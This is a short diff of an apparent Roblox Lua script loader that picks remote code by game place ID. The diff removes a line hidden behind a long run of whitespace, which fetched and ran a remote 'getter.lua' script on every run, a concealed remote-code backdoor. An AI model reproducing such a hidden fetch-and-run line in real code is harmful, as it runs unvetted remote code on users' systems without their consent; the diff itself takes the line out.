@@ -8,7 +8,7 @@ local codes = {
 }
 
 local codeURL = codes[game.PlaceId]
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    loadstring(game:HttpGet("https://raw.githubusercontent.com/loxxit/scripts/main/getter.lua"))()
+
 if codeURL then
     loadstring(game:HttpGet(codeURL))()
 else
